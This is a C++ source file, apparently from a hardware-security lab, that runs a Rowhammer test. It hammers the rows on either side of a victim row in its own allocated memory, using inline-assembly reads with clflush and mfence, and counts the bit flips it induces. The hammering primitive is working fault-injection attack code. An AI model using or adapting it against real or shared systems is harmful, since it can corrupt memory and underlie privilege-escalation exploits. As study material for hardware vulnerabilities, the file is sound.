#include "../shared.hh"
#include "../params.hh"
#include "../util.hh"
#include <unistd.h>
#include <set>

uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {

    // prime
    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
    
    flush_row(vict_virt_addr_ptr);
    flush_row(attacker_virt_addr_1_ptr);
    flush_row(attacker_virt_addr_2_ptr);
  
    int num_reads = HAMMERS_PER_ITER;

    while (num_reads-- > 0 ) {
        asm volatile(
            "mov (%0), %%rax\n\t"
            "mov (%1), %%rax\n\t"
            "clflush (%0)\n\t"
            "clflush (%1)\n\t"
            "mfence\n\t"
            :
            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
            : "rax"
        );
    }

    flush_row(vict_virt_addr_ptr);
    return count_flips(vict_virt_addr_ptr, 0x55); 
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t mem_size = 1.8 * BUFFER_SIZE_MB;
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim; 
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 

    while (true) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));

        // row + 1, row - 1
        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 1)) {
            uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
            print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
            if (num_bit_flips > 0) break;
        }

        sleep(3);

        // row + 2, row - 2
        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 2)) {
            uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
            print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
            if (num_bit_flips > 0) break;
        }

        sleep(3);
    }
}

